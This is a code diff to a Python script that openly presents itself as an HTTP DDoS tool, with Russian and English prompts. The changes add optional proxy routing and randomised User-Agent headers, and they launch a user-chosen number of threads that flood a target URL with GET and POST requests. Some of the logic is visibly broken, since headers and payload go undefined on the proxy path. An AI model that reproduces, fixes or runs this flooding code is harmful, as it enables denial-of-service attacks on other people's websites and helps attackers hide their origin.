@@ -37,9 +37,6 @@ print(Fore.RED + baner + Fore.RESET)
 print(Fore.MAGENTA, "Hi, bro. It`s http sites ddos(I'm not sure about https). To stop script, use the combination Ctrl+Alt+Delete" +  Fore.RESET)
 print(Fore.GREEN + version + Fore.RESET)
 
-parser.add_option("-p", "--proxy",
-                  help="Add proxy")
-
 (options, args) = parser.parse_args()
 
 def on_key_event(e):
@@ -48,15 +45,12 @@ def on_key_event(e):
         exit()
 
 fake = Faker()
+
 ip_addr = fake.ipv4()
-print('[1] - Ddos\n[2] - Выход')
-user_input = input("Выберите опцию: ")
-if user_input == '1':
-    url = input('Url: ')
-    thrnum = int(input('Threads: '))
-    class HeadersGenerator():
-        def __init__(self):
-            self.user_agent = UserAgent()
+
+class HeadersGenerator():
+    def __init__(self):
+        self.user_agent = UserAgent()
 
     def random_headers(self):
         user_agent = self.user_agent.random
@@ -67,13 +61,33 @@ if user_input == '1':
         }
         return headers
 
-    def ddos():
-        for i in range(thrnum):
-            try:
+def ddos():
+    for i in range(thrnum):
+        try:
+            if proxy1 == 'Y':
+                response = requests.get(url, headers=headers, data=payload, proxies={'http': proxy, 'https': proxy})
+                response2 = requests.post(url, headers=headers, data=payload, proxies={'http': proxy, 'https': proxy})
+            else:
                 response = requests.get(url, headers=headers, data=payload)
-                response2 = requests.post(url, headers=headers)
-            except ConnectionError and SystemError and SyntaxError as e:
-                print(f"Error: {e}")
+                response2 = requests.post(url, headers=headers, data=payload)
+        except (ConnectionError, SystemError, SyntaxError) as e:
+            print(f"Error: {e}")
+
+print('[1] - DDoS\n[2] - Выход')
+user_input = input("Выберите опцию: ")
+
+if user_input == '1':
+    url = input('Url: ')
+    thrnum = int(input('Threads: '))
+    proxy1 = input(Fore.YELLOW + 'Do you want to use proxy?[Y/n]')
+
+    if proxy1 == 'Y':
+        proxy = input('Введите прокси: ')
+
+    elif proxy1 == 'n':
+        headers_generator = HeadersGenerator()
+        headers = headers_generator.random_headers()
+        payload = payload
 
         threads = [Thread(target=ddos) for _ in range(thrnum)]
         container = 1
@@ -82,8 +96,8 @@ if user_input == '1':
             container += 1
             print('DDoS...' + str(container))
             thread.start()
-
             print(f'DDoS attack is running with {thrnum} threads...')
+
 elif user_input == '2':
     print('Выход...')
     exit()
